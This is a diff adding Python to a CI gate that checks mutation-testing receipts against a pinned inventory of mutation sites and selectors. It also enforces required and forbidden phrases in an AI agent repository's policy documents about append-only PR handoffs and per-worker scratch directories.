+    ("hooks/guards/git_grep_engine_guard.py", "called function alias state dropped"),
+    ("hooks/guards/git_grep_engine_guard.py", "TRAPDEBUG function alias state dropped"),
+    ("hooks/guards/git_grep_engine_guard.py", "DEBUG trap alias state dropped"),
+    ("hooks/guards/git_grep_engine_guard.py", "repeat zero execution boundary dropped"),
+    ("hooks/guards/git_grep_engine_guard.py", "source command wrapper omitted"),
+    ("hooks/guards/git_grep_engine_guard.py", "source exec wrapper omitted"),
+    ("hooks/guards/git_grep_engine_guard.py", "trap action traversal dropped"),
+    ("hooks/guards/git_grep_engine_guard.py", "zsh trap function source traversal dropped"),
+    ("hooks/guards/zsh_rev_modifier_guard.py", "zsh shared resolver bypassed"),
+    ("hooks/guards/zsh_rev_modifier_guard.py", "zsh trap function traversal dropped"),
+    ("hooks/guards/zsh_rev_modifier_guard.py", "zsh unmodelled modifier uncertainty dropped"),
+    ("hooks/guards/zsh_rev_modifier_guard.py",
+     "zsh unmodelled modifier prefix grammar dropped"),
+}
+EXPECTED_MUTATION_SELECTORS = {
+    ("hooks/announced_work_guard.py", "adjectival group ambiguity guard dropped"):
+        ("main string blocks a group-modified failure adjective before the activity noun",
+         "main content blocks a group-modified failure adjective before the activity noun",
+         "main bare blocks a group-modified failure adjective before the activity noun"),
+    ("hooks/announced_work_guard.py", "adjectival group modifier state dropped"):
+        ("main string preserves a later predicate after an adjective group",
+         "main content preserves a later predicate after an adjective group",
+         "main bare preserves a later predicate after an adjective group"),
+    ("hooks/announced_work_guard.py", "adjectival group subject-resume bridge dropped"):
+        ("main string preserves a later predicate after an adjective group",
+         "main content preserves a later predicate after an adjective group",
+         "main bare preserves a later predicate after an adjective group"),
+    ("hooks/announced_work_guard.py", "attached period classification dropped"):
+        ("main blocks an attached full-stop historical report clause",),
+    ("hooks/announced_work_guard.py", "comma adjective distinction dropped"):
+        ("main blocks a straight possessive comma modifier",
+         "main blocks an overseas comma modifier",
+         "main blocks a DevOps comma modifier"),
+    ("hooks/announced_work_guard.py", "bounded post-group context bridge dropped"):
+        ("main string preserves a bounded post-group CI adjunct",
+         "main content preserves a bounded post-group CI adjunct",
+         "main bare preserves a bounded post-group CI adjunct"),
+    ("hooks/announced_work_guard.py", "colon bridge same-line boundary dropped"):
+        ("a newline keeps a colon from deferring into a group",),
+    ("hooks/announced_work_guard.py", "colon adjectival group deferral dropped"):
+        ("main string blocks a colon group-modified failure adjective",
+         "main content blocks a colon group-modified failure adjective",
+         "main bare blocks a colon group-modified failure adjective"),
+    ("hooks/announced_work_guard.py", "colon grouped-result tail resolution dropped"):
+        ("main string preserves a colon predicate result-group duration adjunct",
+         "main string preserves a colon predicate result-group timestamp adjunct",
+         "main string preserves a colon predicate result-group object adjunct",
+         "main content preserves a colon predicate result-group duration adjunct",
+         "main content preserves a colon predicate result-group timestamp adjunct",
+         "main content preserves a colon predicate result-group object adjunct",
+         "main bare preserves a colon predicate result-group duration adjunct",
+         "main bare preserves a colon predicate result-group timestamp adjunct",
+         "main bare preserves a colon predicate result-group object adjunct"),
+    ("hooks/announced_work_guard.py", "colon predicate bridge classification dropped"):
+        ("main string preserves a colon-deferred modifier after a subject aside",
+         "main string preserves a direct colon predicate modifier",
+         "main content preserves a colon-deferred modifier after a subject aside",
+         "main bare preserves a direct colon predicate modifier"),
+    ("hooks/announced_work_guard.py", "colon predicate-modifier bridge dropped"):
+        ("main string blocks an unknown direct-colon context",
+         "main content blocks an unknown direct-colon context",
+         "main bare blocks an unknown direct-colon context"),
+    ("hooks/announced_work_guard.py", "colon-to-group predicate bridge dropped"):
+        ("main string preserves a colon-deferred predicate after a subject aside",
+         "main content preserves a colon-deferred predicate after a subject aside",
+         "main bare preserves a colon-deferred predicate after a subject aside"),
+    ("hooks/announced_work_guard.py", "comma predicate continuation dropped"):
+        ("main preserves a participial comma result continuation",
+         "main preserves a terminal comma result adverb",
+         "main preserves a direct plural comma subject",
+         "main preserves an audit comma subject",
+         "main preserves a multiword integration-test comma subject",
+         "main preserves a hundred-test comma subject"),
+    ("hooks/announced_work_guard.py", "decorated colon classification dropped"):
+        ("main blocks a unicode colon-labelled historical report",),
+    ("hooks/announced_work_guard.py", "escaped group delimiter handling dropped"):
+        ("main string blocks a predicate after an escaped parenthesis",
+         "main string blocks a predicate after an escaped quote",
+         "main content blocks a predicate after an escaped parenthesis",
+         "main content blocks a predicate after an escaped quote",
+         "main bare blocks a predicate after an escaped parenthesis",
+         "main bare blocks a predicate after an escaped quote"),
+    ("hooks/announced_work_guard.py", "hard separator classification dropped"):
+        ("main blocks attached and decorated historical report clauses",),
+    ("hooks/announced_work_guard.py", "grouped historical subject ownership dropped"):
+        ("a parenthetical historical subject cannot lend its predicate to the activity",
+         "a parenthetical historical subject retains ownership through a modifier",
+         "a parenthetical historical subject retains ownership through a context",
+         "main string blocks a parenthetical historical subject before its predicate",
+         "main string blocks a parenthetical historical subject through a predicate modifier",
+         "main string blocks a parenthetical historical subject through a bounded context"),
+    ("hooks/announced_work_guard.py", "grouped historical compound traversal dropped"):
+        ("a latest CI run retains its grouped predicate",
+         "a previous CI run retains its grouped predicate",
+         "a prior test suite retains its grouped predicate",
+         "a last GitHub Actions run retains its grouped predicate",
+         "main string blocks a latest CI run historical subject",
+         "main string blocks a previous CI run historical subject",
+         "main string blocks a prior test-suite historical subject",
+         "main string blocks a last GitHub Actions run historical subject"),
+    ("hooks/announced_work_guard.py", "grouped historical compound bound dropped"):
+        ("four activity-compound words exceed the ownership bound",),
+    ("hooks/announced_work_guard.py", "grouped latest-run distinction dropped"):
+        ("a latest workflow appositive still describes the outer test",
+         "main string preserves a latest workflow-test appositive"),
+    ("hooks/announced_work_guard.py", "inline-code group recognition dropped"):
+        ("main string blocks a single-backtick nested report",
+         "main string blocks a double-backtick nested report",
+         "main string blocks an emphasised inline-code nested report",
+         "main content blocks a single-backtick nested report",
+         "main content blocks a double-backtick nested report",
+         "main content blocks an emphasised inline-code nested report",
+         "main bare blocks a single-backtick nested report",
+         "main bare blocks a double-backtick nested report",
+         "main bare blocks an emphasised inline-code nested report"),
+    ("hooks/announced_work_guard.py", "open-group association dropped"):
+        ("main string blocks a parenthetical nested report",
+         "main string blocks a parenthetical historical report",
+         "main string blocks a bracketed nested report",
+         "main string blocks a curly-quoted nested report",
+         "main content blocks a parenthetical nested report",
+         "main content blocks a parenthetical historical report",
+         "main content blocks a bracketed nested report",
+         "main content blocks a curly-quoted nested report",
+         "main bare blocks a parenthetical nested report",
+         "main bare blocks a parenthetical historical report",
+         "main bare blocks a bracketed nested report",
+         "main bare blocks a curly-quoted nested report"),
+    ("hooks/announced_work_guard.py", "outer-group closure signal dropped"):
+        ("main string blocks an empty parenthetical from replacing the activity subject",
+         "main string blocks a spaced empty parenthetical from replacing the activity subject",
+         "main string blocks nested empty groups from replacing the activity subject",
+         "main string blocks empty brackets from replacing the activity subject",
+         "main string blocks empty straight-double quotes from replacing the activity subject",
+         "main string blocks empty straight-single quotes from replacing the activity subject",
+         "main string blocks empty inline code from replacing the activity subject",
+         "main content blocks an empty parenthetical from replacing the activity subject",
+         "main content blocks a spaced empty parenthetical from replacing the activity subject",
+         "main content blocks nested empty groups from replacing the activity subject",
+         "main content blocks empty brackets from replacing the activity subject",
+         "main content blocks empty straight-double quotes from replacing the activity subject",
+         "main content blocks empty straight-single quotes from replacing the activity subject",
+         "main content blocks empty inline code from replacing the activity subject",
+         "main bare blocks an empty parenthetical from replacing the activity subject",
+         "main bare blocks a spaced empty parenthetical from replacing the activity subject",
+         "main bare blocks nested empty groups from replacing the activity subject",
+         "main bare blocks empty brackets from replacing the activity subject",
+         "main bare blocks empty straight-double quotes from replacing the activity subject",
+         "main bare blocks empty straight-single quotes from replacing the activity subject",
+         "main bare blocks empty inline code from replacing the activity subject"),
+    ("hooks/announced_work_guard.py", "post-group predicate modifier bridge dropped"):
+        ("main string preserves a modified predicate after a straight-single-quoted subject",
+         "main content preserves a modified predicate after a straight-single-quoted subject",
+         "main bare preserves a modified predicate after a straight-single-quoted subject",
+         "main string preserves a common post-group predicate modifier",
+         "main content preserves a common post-group predicate modifier",
+         "main bare preserves a common post-group predicate modifier"),
+    ("hooks/announced_work_guard.py", "post-group context object validation dropped"):
+        ("main string blocks an unknown post-group context",
+         "main content blocks an unknown post-group context",
+         "main bare blocks an unknown post-group context"),
+    ("hooks/announced_work_guard.py", "post-group subject replacement guard dropped"):
+        ("main string blocks a plural possessive inside a straight-single-quoted aside",
+         "main string blocks a quoted noun from replacing the announced activity subject",
+         "main string blocks a noun after a closed parenthetical from replacing the activity subject",
+         "main content blocks a plural possessive inside a straight-single-quoted aside",
+         "main content blocks a quoted noun from replacing the announced activity subject",
+         "main content blocks a noun after a closed parenthetical from replacing the activity subject",
+         "main bare blocks a plural possessive inside a straight-single-quoted aside",
+         "main bare blocks a quoted noun from replacing the announced activity subject",
+         "main bare blocks a noun after a closed parenthetical from replacing the activity subject"),
+    ("hooks/announced_work_guard.py", "productive complement tokens dropped"):
+        ("main blocks productive interrogative complements",),
+    ("hooks/announced_work_guard.py", "straight-single outer predicate closure dropped"):
+        ("main string preserves a predicate after a straight-single-quoted subject",
+         "main string preserves a modified predicate after a straight-single-quoted subject",
+         "main content preserves a predicate after a straight-single-quoted subject",
+         "main content preserves a modified predicate after a straight-single-quoted subject",
+         "main bare preserves a predicate after a straight-single-quoted subject",
+         "main bare preserves a modified predicate after a straight-single-quoted subject"),
+    ("hooks/announced_work_guard.py", "unexpected judge exception block dropped"):
+        ("unexpected judge exceptions block through main",),
+    ("hooks/announced_work_guard.py", "whole complement-token membership dropped"):
+        ("main keeps a hyphenated complement root inside the activity token",),
+    ("hooks/announced_work_guard.py", "whole report-token membership dropped"):
+        ("main blocks embedded report substrings after a retained activity noun",),
+    ("hooks/announced_work_guard.py", "URL punctuation bypass dropped"):
+        ("main keeps URL query punctuation inside the direct report",
+         "main keeps uppercase URL hostname dots inside the direct report",
+         "main keeps URL semicolons opaque until whitespace",
+         "main keeps URL exclamations opaque until whitespace",
+         "main keeps mixed-case URL dots opaque until whitespace"),
+    ("hooks/announced_work_guard.py", "URL prose-release boundary dropped"):
+        ("main string keeps a URL closing backtick out of prose grouping",
+         "main content keeps a URL closing backtick out of prose grouping",
+         "main bare keeps a URL closing backtick out of prose grouping"),
+    ("hooks/announced_work_guard.py", "URL trailing-punctuation trim dropped"):
+        ("a comma ending a URL is prose punctuation",
+         "main blocks a report after a URL-ending comma",
+         "a colon ending a URL is prose punctuation",
+         "a semicolon ending a URL is prose punctuation",
+         "main string blocks a report after a URL-ending colon",
+         "main string blocks a report after a URL-ending semicolon"),
+    ("hooks/announced_work_guard.py", "URL semantic-token bypass dropped"):
+        ("main keeps URL complement words opaque",
+         "main ignores report words inside a URL"),
+    ("tools/repository_ownership.py", "effective core.worktree scalar lookup dropped"):
+        ("a repeated core.worktree binds the effective candidate Git recognises",),
+}
+EXPECTED_MUTATION_SITE_DIGEST = (
+    "5d72b8fdb3c017fdfddd2c35e8463cf1d89bde5d26af3ad6852a0dc301270d6d"
+)
+EXPECTED_MUTATION_EXCLUSIONS = {
+    "hooks/guards/git_grep_engine_guard.py::ALIAS_GUARDED":
+        "repeated characters identify an enum word, not a membership charset",
+    "hooks/guards/git_grep_engine_guard.py::ALIAS_HARMLESS":
+        "repeated characters identify an enum word, not a membership charset",
+    "hooks/guards/git_grep_engine_guard.py::ALIAS_UNCERTAIN":
+        "repeated characters identify an enum word, not a membership charset",
+    "hooks/guards/git_grep_engine_guard.py::FIXTURES":
+        "fixture corpus; removing a fixture measures the grader",
+    "hooks/guards/git_grep_engine_guard.py::GREP_LONG_PATTERN_ARG":
+        "empty grammar collection has no element mutation; absence is fixture-pinned",
+    "hooks/guards/git_grep_engine_guard.py::ZSH_EQUALS_OFF":
+        "repeated characters identify an enum word, not a membership charset",
+    "hooks/guards/git_grep_engine_guard.py::ZSH_EQUALS_UNKNOWN":
+        "repeated characters identify an enum word, not a membership charset",
+    "hooks/guards/git_grep_engine_guard.py::_EQUALS_LOOKUP_CACHE":
+        "runtime memoization map, not a guarded membership collection",
+    "hooks/guards/git_grep_engine_guard.py::_GIT_AUTHORITY_CACHE":
+        "runtime memoization map, not a guarded membership collection",
+    "hooks/guards/zsh_rev_modifier_guard.py::FIXTURES":
+        "fixture corpus; removing a fixture measures the grader",
+    "hooks/guards/zsh_rev_modifier_guard.py::UNRESOLVED_GIT":
+        "repeated characters identify an enum word, not a membership charset",
+}
+
+
+def mutation_unasserted_kill_ceiling() -> int:
+    """Read the fresh-observation ceiling from the mutation evidence owner."""
+    spec = importlib.util.spec_from_file_location(
+        "_ci_gate_mutation_ceiling", ROOT / "tools/write-mutation-receipt.py")
+    if spec is None or spec.loader is None:
+        raise ValueError("cannot load write-mutation-receipt.py for its kill ceiling")
+    module = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(module)
+    return module.UNASSERTED_KILL_CEILING
+
+
+def mutation_site_policy_digest(descriptors) -> str:
+    """Hash every semantic site field under a stable, reviewable framing."""
+    records = []
+    for descriptor in descriptors:
+        records.append({
+            "module": descriptor["module"],
+            "label": descriptor["label"],
+            "anchor_sha256": descriptor["anchor_sha256"],
+            "replacement_sha256": descriptor["replacement_sha256"],
+            "selectors": list(descriptor.get("selectors", ())),
+            "allowed_statuses": list(descriptor["allowed_statuses"]),
+        })
+    records.sort(key=lambda item: (item["module"], item["label"]))
+    framed = json.dumps(
+        records, sort_keys=True, separators=(",", ":")).encode("utf-8")
+    return hashlib.sha256(framed).hexdigest()
+
+
+def mutation_policy_error(plan, exclusions, policy) -> str:
+    """Validate the plan against a closed inventory independent of its generator."""
+    collection_counts = {}
+    addition_descriptors = []
+    site_identities = []
+    site_descriptors = []
+    selector_inventory = {}
+    semantic_targets = []
+    ids = []
+    problems = []
+    for descriptor in plan:
+        if not isinstance(descriptor, dict):
+            return "mutation plan contains a non-object descriptor"
+        ids.append(descriptor.get("id"))
+        if descriptor.get("kind") == "set-element":
+            identity = (descriptor.get("module"), descriptor.get("name"))
+            collection_counts[identity] = collection_counts.get(identity, 0) + 1
+            if descriptor.get("allowed_statuses") not in ([], ()):
+                problems.append(
+                    f"set-element descriptor permits a non-behavioral kill for {identity}")
+        elif descriptor.get("kind") == "site":
+            module = descriptor.get("module")
+            label = descriptor.get("label")
+            anchor = descriptor.get("anchor_sha256")
+            replacement = descriptor.get("replacement_sha256")
+            selectors = descriptor.get("selectors", ())
+            allowed = descriptor.get("allowed_statuses")
+            site_identities.append((module, label))
+            if (not isinstance(module, str) or not isinstance(label, str)
+                    or not isinstance(anchor, str)
+                    or not re.fullmatch(r"[0-9a-f]{64}", anchor)
+                    or not isinstance(replacement, str)
+                    or not re.fullmatch(r"[0-9a-f]{64}", replacement)
+                    or not isinstance(selectors, (list, tuple))
+                    or any(not isinstance(selector, str) or not selector
+                           for selector in selectors)
+                    or len(selectors) != len(set(selectors))
+                    or not isinstance(allowed, (list, tuple))
+                    or any(not isinstance(status, str) for status in allowed)):
+                problems.append(f"site descriptor fields are invalid for {(module, label)}")
+                continue
+            normalized = {
+                "module": module, "label": label,
+                "anchor_sha256": anchor,
+                "replacement_sha256": replacement,
+                "selectors": tuple(selectors),
+                "allowed_statuses": tuple(allowed),
+            }
+            site_descriptors.append(normalized)
+            if selectors:
+                selector_inventory[(module, label)] = tuple(selectors)
+            semantic_targets.append((module, anchor, replacement))
+        elif descriptor.get("kind") == "set-addition":
+            module = descriptor.get("module")
+            name = descriptor.get("name")
+            collection_kind = descriptor.get("collection_kind")
+            element = descriptor.get("element")
+            label = descriptor.get("label")
+            allowed = descriptor.get("allowed_statuses")
+            if (not isinstance(module, str) or not isinstance(name, str)
+                    or not isinstance(collection_kind, str)
+                    or not isinstance(element, str) or not isinstance(label, str)
+                    or not isinstance(allowed, (list, tuple))
+                    or any(not isinstance(status, str) for status in allowed)):
+                problems.append(
+                    f"addition descriptor fields are invalid for {(module, name)}")
+                continue
+            addition_descriptors.append(
+                (module, name, collection_kind, element, label, tuple(allowed)))
+        else:
+            return f"mutation plan contains unknown kind {descriptor.get('kind')!r}"
+    if len(addition_descriptors) != len(set(addition_descriptors)):
+        problems.append("addition inventory contains duplicate full descriptors")
+    if set(addition_descriptors) != policy["additions"]:
+        problems.append(
+            f"addition inventory differs: observed={set(addition_descriptors)} "
+            f"required={policy['additions']}")
+    if collection_counts != policy["collections"]:
+        problems.append(
+            f"collection inventory differs: observed={collection_counts} "
+            f"required={policy['collections']}")
+    if len(site_identities) != len(set(site_identities)):
+        problems.append("site inventory contains duplicate module/label identities")
+    if set(site_identities) != policy["sites"]:
+        problems.append(
+            f"site inventory differs: observed={set(site_identities)} "
+            f"required={policy['sites']}")
+    if selector_inventory != policy["selectors"]:
+        problems.append(
+            f"site selector inventory differs: observed={selector_inventory} "
+            f"required={policy['selectors']}")
+    if len(semantic_targets) != len(set(semantic_targets)):
+        problems.append("site inventory contains duplicate semantic mutation targets")
+    if (len(site_descriptors) == len(site_identities)
+            and mutation_site_policy_digest(site_descriptors)
+            != policy["site_digest"]):
+        problems.append("site descriptor semantics differ from the independent digest")
+    if exclusions != policy["exclusions"]:
+        problems.append("sweep exclusions differ from the independent closed inventory")
+    if len(plan) < policy["floor"]:
+        problems.append(
+            f"plan cardinality {len(plan)} is below floor {policy['floor']}")
+    if len(ids) != len(set(ids)) or any(not isinstance(item, str) for item in ids):
+        problems.append("mutation IDs are missing or duplicated")
+    return "; ".join(problems)
+
+
+def mutation_receipt_error(receipt_data=None, plan=None, exclusions=None,
+                           contract=None, current_sources=None, ceiling=None,
+                           policy=None, unasserted_ceiling=None,
+                           unasserted_identities=None) -> str:
+    """Validate exact mutation schema, plan coverage, and every derived field."""
+    try:
+        production_contract = plan is None or exclusions is None or contract is None
+        if receipt_data is None:
+            receipt_data = _json_without_duplicate_keys(MUTATION_RECEIPT)
+        if plan is None or exclusions is None or contract is None:
+            spec = importlib.util.spec_from_file_location(
+                "_ci_gate_mutation", ROOT / "tools/write-mutation-receipt.py")
+            if spec is None or spec.loader is None:
+                return "cannot load write-mutation-receipt.py for the mutation receipt"
+            module = importlib.util.module_from_spec(spec)
+            spec.loader.exec_module(module)
+            plan, exclusions = module.mutation_plan()
+            contract = {
+                "schema_version": module.SCHEMA_VERSION,
+                # A schema pin, not an attestation: this field is a constant the gate
+                # compares, so it can never record which flags actually ran. It previously
+                # named --accept-receipt-changes unconditionally, which read as provenance
+                # for the one bypass that skips receipt comparison. CI aggregates in verify
+                # mode, so a real mode field cannot live here either -- the freshly computed
+                # value would never equal the committed one.
+                "generated_by": f"{module.GENERATOR} --aggregate",
+                "note": module.NOTE,
+                "keys": tuple(module.RECEIPT_KEYS),
+                "generator_sha256": module.file_sha256(ROOT / module.GENERATOR),
+                "guards": tuple(module.GUARDS),
+                "plan_sha256": module.digest(plan),
+                "kill_reasons": frozenset(module.KILL_REASONS),
+                "unasserted_reason": module.UNASSERTED_KILL_REASON,
+                "unasserted_ceiling": module.UNASSERTED_KILL_CEILING,
+            }
+            current_sources = module.source_digests()
+        if policy is None and production_contract:
+            policy = {
+                "collections": EXPECTED_MUTATION_COLLECTIONS,
+                "sites": EXPECTED_MUTATION_SITES,
+                "selectors": EXPECTED_MUTATION_SELECTORS,
+                "site_digest": EXPECTED_MUTATION_SITE_DIGEST,
+                "exclusions": EXPECTED_MUTATION_EXCLUSIONS,
+                "additions": EXPECTED_MUTATION_ADDITIONS,
+                "floor": MUTATION_PLAN_FLOOR,
+            }
+        if ceiling is None:
+            ceiling = MUTATION_SURVIVOR_DEBT_CEILING
+        if unasserted_ceiling is None:
+            unasserted_ceiling = contract["unasserted_ceiling"]
+        if unasserted_identities is None:
+            unasserted_identities = EXPECTED_UNASSERTED_KILLS
+    except Exception as exc:
+        return f"cannot verify the mutation receipt: {exc!r}"
+    if not isinstance(receipt_data, dict):
+        return "mutation receipt root is not an object"
+    problems = []
+    if policy is not None:
+        policy_problem = mutation_policy_error(plan, exclusions, policy)
+        if policy_problem:
+            problems.append("closed mutation policy: " + policy_problem)
+    expected_fields = set(contract["keys"])
+    actual_fields = set(receipt_data)
+    if actual_fields != expected_fields:
+        problems.append(
+            f"top-level fields missing={sorted(expected_fields - actual_fields)} "
+            f"unexpected={sorted(actual_fields - expected_fields)}")
+    for field in ("schema_version", "generated_by", "note", "generator_sha256",
+                  "plan_sha256"):
+        expected = contract[field]
+        if receipt_data.get(field) != expected:
+            problems.append(f"{field} differs from the generator contract")
+    if receipt_data.get("source_digests") != current_sources:
+        problems.append("source digests do not equal all current guard sources")
+    if receipt_data.get("baseline") != {
+            relative: "passed" for relative in contract["guards"]}:
+        problems.append("baseline does not prove every mutation-owned suite passed")
+    if receipt_data.get("sweep_exclusions") != exclusions:
+        problems.append("module-qualified sweep exclusions differ from the exact scan")
+    plan_by_id = {item["id"]: item for item in plan}
+    results = receipt_data.get("results")
+    if not isinstance(results, dict) or not results:
+        problems.append("results are empty or not an object")
+        results = {}
+    missing = sorted(set(plan_by_id) - set(results))
+    foreign = sorted(set(results) - set(plan_by_id))
+    if missing or foreign:
+        problems.append(f"result inventory missing={missing[:4]} foreign={foreign[:4]}")
+    observed_survivors = []
+    addition_survivors = []
+    site_survivors = []
+    observed_unasserted = []
+    unasserted_reason = contract["unasserted_reason"]
+    for mutation_id in sorted(set(plan_by_id) & set(results)):
+        expected = dict(plan_by_id[mutation_id])
+        allowed_statuses = set(expected.pop("allowed_statuses", ()) or ())
+        recorded = results[mutation_id]
+        if not isinstance(recorded, dict):
+            problems.append(f"result {mutation_id} is not an object")
+            continue
+        outcome = recorded.get("outcome")
+        if outcome not in {"caught", "survived"}:
+            problems.append(f"result {mutation_id} has invalid outcome {outcome!r}")
+            continue
+        reason = recorded.get("reason")
+        if reason not in contract["kill_reasons"]:
+            problems.append(f"result {mutation_id} has invalid reason {reason!r}")
+            continue
+        # A survived outcome has exactly one truthful reason, and a kill can never carry it.
+        # Without this the reason is decorative: a caught result could record "survived" and
+        # the unasserted tally below would be whatever the generator chose to report.
+        if (outcome == "survived") != (reason == "survived"):
+            problems.append(
+                f"result {mutation_id} outcome {outcome!r} contradicts reason {reason!r}")
+            continue
+        # Only the predeclared performance timeout is a legitimate non-receipt kill.
+        # An invalid receipt is absent from the reason vocabulary and fails above.
+        if reason == "timeout" and reason not in allowed_statuses:
+            problems.append(
+                f"result {mutation_id} records status {reason!r} its plan does not allow")
+            continue
+        selectors = tuple(expected.get("selectors", ()) or ())
+        reachable_reasons = ({"selector-failure"} if selectors else {
+            "suite-failure", unasserted_reason,
+        }) | allowed_statuses
+        if outcome == "caught" and reason not in reachable_reasons:
+            problems.append(
+                f"result {mutation_id} records reason {reason!r}, which is unreachable "
+                f"for a descriptor with {len(selectors)} selector(s)")
+            continue
+        expected["outcome"] = outcome
+        expected["reason"] = reason
+        if recorded != expected:
+            problems.append(f"result {mutation_id} fields do not match its planned mutation")
+        if outcome == "survived":
+            observed_survivors.append(mutation_id)
+            if expected["kind"] == "site":
+                site_survivors.append(mutation_id)
+            elif expected["kind"] == "set-addition":
+                addition_survivors.append(mutation_id)
+        elif reason == unasserted_reason:
+            observed_unasserted.append(mutation_id)
+    if receipt_data.get("survivors") != observed_survivors:
+        problems.append("survivor IDs are not exactly derived from results")
+    if receipt_data.get("unasserted_kills") != observed_unasserted:
+        problems.append("unasserted-kill IDs are not exactly derived from results")
+    recorded_unasserted = {
+        (results[i].get("module"), results[i].get("name"), results[i].get("element"))
+        for i in observed_unasserted if isinstance(results.get(i), dict)
+    }
+    if recorded_unasserted != set(unasserted_identities):
+        problems.append(
+            f"recorded unasserted kills {sorted(recorded_unasserted)} differ from the "
+            f"reviewed set {sorted(unasserted_identities)}")
+    if len(observed_unasserted) > unasserted_ceiling:
+        problems.append(
+            f"unasserted kills {len(observed_unasserted)} exceed ceiling "
+            f"{unasserted_ceiling}: these mutations are recorded caught while no assertion "
+            f"failed, so the count is not evidence the suites observe them")
+    if receipt_data.get("total") != len(plan_by_id):
+        problems.append("total is not the exact mutation-plan cardinality")
+    if receipt_data.get("caught") != len(plan_by_id) - len(observed_survivors):
+        problems.append("caught is not derived from total minus survivors")
+    if site_survivors:
+        problems.append(f"site mutations survived: {site_survivors[:4]}")
+    if addition_survivors:
+        problems.append(f"declared additions survived: {addition_survivors[:4]}")
+    if len(observed_survivors) > ceiling:
+        problems.append(
+            f"survivor debt {len(observed_survivors)} exceeds ceiling {ceiling}")
+    return ("mutation receipt mismatch: " + "; ".join(problems[:8])) if problems else ""
+
+
+def mutation_summary_error(receipt_data=None, summary_bytes=None) -> str:
+    """Require the canonical summary bytes to be derived from the strict receipt."""
+    try:
+        if receipt_data is None:
+            receipt_data = _json_without_duplicate_keys(MUTATION_RECEIPT)
+        receipt_problem = mutation_receipt_error(receipt_data=receipt_data)
+        if receipt_problem:
+            return "cannot derive mutation summary from an invalid receipt: " + receipt_problem
+        spec = importlib.util.spec_from_file_location(
+            "_ci_gate_mutation_summary", ROOT / "tools/write-mutation-receipt.py")
+        if spec is None or spec.loader is None:
+            return "cannot load write-mutation-receipt.py for summary derivation"
+        module = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(module)
+        expected = module.summary_text(receipt_data).encode("utf-8")
+        actual = MUTATION_SUMMARY.read_bytes() if summary_bytes is None else summary_bytes
+    except Exception as exc:
+        return f"cannot verify mutation summary derivation: {exc!r}"
+    if actual != expected:
+        return "contracts/goldens/mutation-summary.md is not derived from the strict receipt"
+    return ""
+
+
+REVIEW_ROOT = ROOT / "contracts/review"
+FROZEN_PUBLICATION = REVIEW_ROOT / "pr-8/frozen-publication.json"
+INCLUDE_OPEN = "<!-- include: "
+INCLUDE_CLOSE = "<!-- end include -->"
+FENCE_MARKERS = ("```", "~~~")
+REQUIRED_REVIEW_INCLUDES = {}
+REGISTERED_REVIEW_PATHS = frozenset({
+    "README.md",
+    "pr-8/frozen-publication.json",
+})
+HANDOFF_DOCTRINE = {
+    "AGENTS.md": (
+        "Published pull-request narrative is append-only.",
+        "leave its title, body, and existing comments unchanged",
+        "publish corrections, later-head evidence, and handoffs as new comments",
+    ),
+    "skills/outbound-drafts/SKILL.md": (
+        "Review handoffs are append-only, one exact head per comment.",
+        "Never edit, replace, or delete a posted handoff",
+        "Published PR narrative is append-only.",
+        "Freeze the body and title after creation",
+    ),
+    "skills/pr-review-method/SKILL.md": (
+        "A head-specific handoff",
+        "it never owns a finding",
+    ),
+    "skills/pr-review-method/references/deferred.md": (
+        "append-only handoff comments, one exact head per comment",
+    ),
+    "contracts/review/README.md": (
+        "Head-specific handoffs are append-only external comments",
+        "A later handoff requires one or more repeatable `--predecessor-url` values",
+        "Do not keep a mutable tracked file as the current handoff",
+        "All published PR narrative is append-only.",
+        "The pull-request body and title are frozen after initial publication",
+    ),
+}
+FORBIDDEN_HANDOFF_DOCTRINE = (
+    "one roll-up comment per pr",
+    "one roll-up per pull request",
+    "one tracking comment edited in place",
+    "edited in place across rounds",
+    "edited rather than reposted",
+    "description and title are mutable current-state documents",
+    "build each by editing the file and posting from it",
+)
+WORKSPACE_DOCTRINE = {
+    "AGENTS.md": (
+        "Every dispatched worker owns an exclusive scratch directory",
+        "The parent never reads a scratch path it did not assign.",
+        "`Scratch: <absolute path>`",
+        "atomically reserves the fresh directory mode 0700",
+    ),
+    "CLAUDE.md": (
+        # No installer enforces the order, so the ordering itself is the artifact. Deleting
+        # this leaves a partial sync producing a total spawn outage with nothing explaining it.
+        "Copy hook sources before",
+        "every subagent inherits that exact path",
+        "the shared root is not a workspace",
+        "defines no `$CLAUDE_SCRATCHPAD` producer",
+    ),
+    "docs/openai-agents.md": (
+        # The sentence carrying the current activation mechanism. Unpinned, it could be
+        # deleted and the retired mechanism described in its place with the gate green.
+        "Scratch enforcement is activated by the",
+        "Codex hands a subagent no scratch directory.",
+        "name one fresh absent path per worker",
+        "neither shipped runtime uses that weaker mode",
+        "Two calls naming one path cannot both pass.",
+    ),
+    "skills/agent-dispatch/references/deferred.md": (
+        "a dispatched worker owns its scratch directory",
+        "never read a scratch path you did not assign",
+    ),
+}
+# The shared policy is read by every runtime, so it states the property and never a path.
+# A concrete directory belongs to whichever adapter owns that runtime; naming one here hands
+# the other runtimes a rule they cannot satisfy and quietly makes the policy Claude-only.
+SHARED_POLICY_DOCUMENT = "AGENTS.md"
+# A channel claim that no longer matches the installed CLI is worse than no claim: it sends an
+# implementer to build on something that may not exist. Forbidden in the skill BODY, which is
+# what an agent loads first; references/ must stay free to name the retired spelling in order
+# to explain why it was retired.
+DISPATCH_BODY_DOCUMENT = "skills/agent-dispatch/SKILL.md"
+RETIRED_DISPATCH_CLAIMS = (
+    "append-to-subagent-system-prompt",
+    "append-flag pierces every nesting depth",
+)
+# A required-phrase check is monotone: a document can carry the phrase and revoke it in the next
+# sentence. The negation set is the non-monotone dual, so the rule cannot be withdrawn in prose
+# while the gate stays green.
+FORBIDDEN_WORKSPACE_NEGATIONS = (
+    "workers share one directory",
+    "share one scratch directory",
+    "rule withdrawn",
+    "do not assign per-worker scratch",
+    "a shared scratch directory is fine",
+    # The retired activation mechanism. The code-side scan already refuses its return to the
+    # guard, but the prose side did not: restoring these sentences to the shared policy left
+    # the whole gate green, so doctrine could revert without a single check moving.
+    "a tree without it passes silently",
+    "a project opts in by carrying the rule",
+)
+# The installed registrations activate scratch enforcement explicitly. Repository prose is not
+# an authority bit that the constrained checkout may turn off.
+SPAWN_GUARD_SOURCE = "hooks/spawn_preflight_guard.py"
+RUNTIME_PATHS_FORBIDDEN_IN_SHARED_POLICY = (
+    "~/.claude",
+    "~/.codex",
+    "/private/tmp/claude",
+    ".claude/skills",
+    ".codex/tmp",
+)
